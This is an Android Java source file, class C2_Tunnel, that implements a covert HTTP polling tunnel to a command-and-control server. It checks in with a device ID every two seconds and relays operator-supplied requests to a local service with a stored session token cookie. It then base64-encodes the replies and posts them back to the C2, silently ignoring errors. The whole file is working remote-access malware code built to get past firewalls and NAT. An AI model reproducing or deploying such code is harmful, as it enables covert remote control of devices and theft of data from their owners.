package com.labs.labrats;

import android.content.Context;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Tactical HTTP Polling Tunnel Engine.
 * Bypasses all NATs, firewalls, and cloud proxy timeout drops without requiring persistent WebSockets.
 */
public class C2_Tunnel {

    private static final String TAG = "C2_Tunnel";
    private static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
    private static volatile boolean isRunning = false;

    public static synchronized void start(Context context) {
        if (isRunning) return;
        isRunning = true;

        String c2Url = BuildConfig.WEBHOOK_URL;
        if (c2Url == null || c2Url.trim().isEmpty()) return;
        if (c2Url.contains("script.google.com") || c2Url.contains("script.googleusercontent.com")) return;

        String baseC2 = c2Url.trim();
        if (baseC2.endsWith("/checkin")) {
            baseC2 = baseC2.substring(0, baseC2.length() - 8);
        }
        while (baseC2.endsWith("/")) {
            baseC2 = baseC2.substring(0, baseC2.length() - 1);
        }

        String deviceId = C2_Uploader.getDeviceId(context);
        String pollUrl = baseC2 + "/tunnel-poll?deviceId=" + deviceId;
        String respUrl = baseC2 + "/tunnel-response";

        Log.d(TAG, "Initiating HTTP Polling Tunnel Uplink: " + pollUrl);
        FirebaseConfig.logActivity("TUNNEL_SYNC: HTTP polling proxy connected to C2.");

        scheduler.scheduleWithFixedDelay(() -> {
            if (!isRunning) return;
            HttpURLConnection conn = null;
            try {
                URL url = new URL(pollUrl);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                if (conn.getResponseCode() == 200) {
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            sb.append(line);
                        }
                        String responseStr = sb.toString().trim();
                        if (!responseStr.isEmpty() && !responseStr.equals("{}")) {
                            JSONObject cmd = new JSONObject(responseStr);
                            String type = cmd.optString("type");
                            String requestId = cmd.optString("id");

                            if ("request".equals(type)) {
                                String path = cmd.optString("path");
                                String method = cmd.optString("method", "GET");
                                String body = cmd.optString("body", "");

                                LabRatsWorker.execute(() -> relayLocalRequest(method, path, body, requestId, respUrl, deviceId));
                            }
                        }
                    }
                }
            } catch (Exception e) {
                // Silent catch during network transition
            } finally {
                if (conn != null) conn.disconnect();
            }
        }, 1, 2, TimeUnit.SECONDS);
    }

    private static void relayLocalRequest(String method, String path, String body, String requestId, String respUrl, String deviceId) {
        HttpURLConnection conn = null;
        HttpURLConnection respConn = null;
        try {
            String localPath = (path == null || path.isEmpty()) ? "/" : path;
            URL url = new URL("http://127.0.0.1:" + FirebaseConfig.DEFAULT_PORT + localPath);
            conn = (HttpURLConnection) url.openConnection();
            conn.setInstanceFollowRedirects(false);
            conn.setRequestMethod(method);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Accept-Encoding", "identity");
            conn.setRequestProperty("Cookie", "token=" + WorkManager_Sync.activeSessionToken);

            if ("POST".equalsIgnoreCase(method) && !body.isEmpty()) {
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                try (java.io.OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
            }

            int code = conn.getResponseCode();
            String contentType = conn.getContentType();

            InputStream is = (code < 400) ? conn.getInputStream() : conn.getErrorStream();
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            if (is != null) {
                byte[] data = new byte[16384];
                int nRead;
                while ((nRead = is.read(data, 0, data.length)) != -1) {
                    buffer.write(data, 0, nRead);
                }
            }

            JSONObject resp = new JSONObject();
            resp.put("deviceId", deviceId);
            resp.put("type", "response");
            resp.put("id", requestId);
            resp.put("status", code);
            resp.put("contentType", contentType);
            resp.put("payload", Base64.encodeToString(buffer.toByteArray(), Base64.NO_WRAP));

            URL postUrl = new URL(respUrl);
            respConn = (HttpURLConnection) postUrl.openConnection();
            respConn.setRequestMethod("POST");
            respConn.setDoOutput(true);
            respConn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            try (java.io.OutputStream os = respConn.getOutputStream()) {
                byte[] input = resp.toString().getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            respConn.getResponseCode();

        } catch (Exception e) {
            Log.e(TAG, "Relay Error: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
            if (respConn != null) respConn.disconnect();
        }
    }

    public static synchronized void stop() {
        isRunning = false;
    }
}
